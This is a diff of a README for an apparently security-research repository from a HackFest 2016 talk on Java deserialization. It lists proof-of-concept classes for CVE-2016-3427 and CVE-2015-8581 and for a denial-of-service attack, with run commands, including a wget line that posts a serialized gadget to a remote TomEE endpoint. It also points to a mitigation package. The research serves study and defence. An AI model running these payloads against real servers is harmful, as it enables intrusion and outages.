@@ -1,7 +1,7 @@
 # Fixing the Java Serialization mess
 Supporting source code for a [HackFest 2016 presentation](https://hackfest.ca/en/speakers/#ernst)
 
-![Bonhomme Carnaval, Duke-style](bonhomme-duke.svg "Bonhomme Carnaval, Duke-style")
+![Bonhomme Carnaval, Duke-style](bonhomme-duke.svg.png "Bonhomme Carnaval, Duke-style")
 
 ## Installation
 ```bash
@@ -12,7 +12,9 @@ mvn install
 
 ### POC for [CVE-2016-3427](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3427)
 Class `com.salesforce.trust.s11n.exploit.JmxClient`
+
 Tries to:
+
 1. Connect to the provided JMX server using the *long* connection string syntax
 2. Connect to the provided JMX server using the *RMI* connection string syntax.
   * Sends the provided user name and password as credentials.
@@ -23,6 +25,7 @@ java -cp target/hackfest-2016.jar:target/lib/commons-io-2.5.jar:target/lib/javae
 
 ### POC for Denial of Service attack
 Class `com.salesforce.trust.s11n.exploit.JreOutOfMemory`
+
 Throws `OutOfMemoryError` when deserializingin doctored instances of various well known classes
 ```bash
 java -cp target/hackfest-2016.jar:target/lib/commons-io-2.5.jar:target/lib/javaee-api-6.0-6.jar:target/lib/openejb-core-4.7.4.jar:target/lib/openwebbeans-impl-1.2.7.jar:target/lib/openwebbeans-spi-1.2.7.jar:target/lib/serp-1.15.1.jar:target/lib/tomcat-juli-8.5.5.jar:target/lib/tomcat-tribes-8.5.5.jar com.salesforce.trust.s11n.exploit.JreOutOfMemory
@@ -30,6 +33,7 @@ java -cp target/hackfest-2016.jar:target/lib/commons-io-2.5.jar:target/lib/javae
 
 ### POC for [CVE-2015-8581](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8581)
 Class `com.salesforce.trust.s11n.exploit.TomeeLookAheadBypass`
+
 Generates a 'regular' gadget that can be used on older versions of [Apache TomEE](http://tomee.apache.org/apache-tomee.html) (before LookAhead validation was added, 1.7.3 or older)
 #### Gadget chain: 
 ```
@@ -91,6 +95,6 @@ wget --post-file tomee2.ser http://remote-server:8080/tomee/ejb
 
 ### POC for LookAhead Bytecode Blacklist
 #### Input validation flow
-![Flow chart](flow-chart.svg "Flow chart")
+![Flow chart](flow-chart.svg.png "Flow chart")
 #### Code
 Package `com.salesforce.trust.s11n.mitigation`
